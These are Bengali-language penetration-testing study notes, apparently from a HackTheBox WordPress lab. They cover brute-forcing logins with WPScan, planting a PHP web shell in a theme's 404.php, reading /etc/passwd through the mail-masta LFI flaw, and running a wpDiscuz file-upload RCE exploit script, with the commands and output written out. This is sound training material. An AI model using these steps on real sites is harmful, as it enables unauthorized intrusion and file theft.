## 1. Login Bruteforce

WordPress-এ login brute force করার জন্য WPScan ব্যবহার করা যায়। আগের enumeration-এ `admin` ও `john` user পাওয়া গিয়েছিল।

- `wp-login`: সাধারণ login page-এ brute force করে।
- `xmlrpc`: `/xmlrpc.php` API ব্যবহার করে login চেষ্টা করে। এটি দ্রুত।

লিংক: [XML-RPC](https://kinsta.com/blog/xmlrpc-php/?utm_source=chatgpt.com)

## 2. Code Execution

Administrator access থাকলে WordPress-এর Theme Editor দিয়ে PHP code পরিবর্তন করে command execute করা সম্ভব।

ধাপ:

1. `john` credentials দিয়ে login করো।
2. Appearance → Theme Editor খোলো।
3. Active theme নষ্ট হওয়া এড়াতে inactive theme নির্বাচন করো, যেমন `Twenty Nineteen`।
4. `404.php` ফাইলে নিচের code যোগ করো।

```
system($_GET[0]);
```

এটি GET parameter `0` দিয়ে command execute করে।

Theme Editor URL:

`http://blog.inlanefreight.local/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen`

[Theme Editor Image](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/theme_editor.png?utm_source=chatgpt.com)

Update File চাপার পর web shell ব্যবহার করো।

```
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Themes-এর directory: `/wp-content/themes/<theme name>`

এই access থেকে reverse shell নিয়ে target enumerate করা যায়।

## 3. Leveraging Known Vulnerabilities

WordPress-এর vulnerability-এর বড় অংশ plugins-এ থাকে।

[WPScan Vulnerability Statistics](https://wpscan.com/statistics?utm_source=chatgpt.com) অনুযায়ী, লেখার সময় database-এ 23,595 vulnerabilities ছিল:

- 4% — WordPress core
- 89% — Plugins
- 7% — Themes

2014 সাল থেকে vulnerability সংখ্যা বেড়েছে। অনেক free ও paid themes/plugins তৈরি হচ্ছে। তাই unused বা পুরোনো plugins-ও পরীক্ষা করতে হবে—সেগুলো আর ব্যবহার না হলেও directory থেকে যেতে পারে এবং vulnerable থাকতে পারে।

পুরোনো website version খুঁজতে [waybackurls](https://github.com/tomnomnom/waybackurls?utm_source=chatgpt.com) ব্যবহার করা যায়। Wayback Machine-এ পুরোনো version বা vulnerable plugin পাওয়া যেতে পারে। Plugin সরানো না হলে তার directory এখনও accessible থাকতে পারে।

### 3.1 Vulnerable Plugin — mail-masta

[mail-masta](https://wordpress.org/plugins/mail-masta/?utm_source=chatgpt.com) আর supported নয়; তবে এর [2,300+ downloads](https://wordpress.org/plugins/mail-masta/advanced/?utm_source=chatgpt.com) ছিল।

2016 সাল থেকে এর মধ্যে রয়েছে:

- [Unauthenticated SQL Injection](https://www.exploit-db.com/exploits/41438?utm_source=chatgpt.com)
- [Local File Inclusion (LFI)](https://www.exploit-db.com/exploits/50226?utm_source=chatgpt.com)

Vulnerable code:

```
<?php

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

`pl` parameter-এ validation বা sanitization নেই। তাই arbitrary file include করা সম্ভব।

`/etc/passwd` পড়তে:

```
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

### 3.2 Vulnerable Plugin — wpDiscuz

[wpDiscuz](https://wpdiscuz.com/?utm_source=chatgpt.com) comments feature উন্নত করে। লেখার সময় এর [1.6 million+ downloads](https://wordpress.org/plugins/wpdiscuz/advanced/?utm_source=chatgpt.com) ও 90,000+ active installations ছিল।

Version `7.0.4` হলে এই [exploit](https://www.exploit-db.com/exploits/49967?utm_source=chatgpt.com) কাজ করতে পারে। এটি file upload bypass vulnerability:

- Plugin শুধু image attachment অনুমোদন করার কথা।
- MIME type check bypass করা যায়।
- Unauthenticated attacker malicious PHP file upload করে RCE পেতে পারে।

বিস্তারিত: [Wordfence — MIME type detection bypass](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/?utm_source=chatgpt.com)

Exploit-এর parameter:

- `-u`: URL
- `-p`: valid post-এর path

```
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
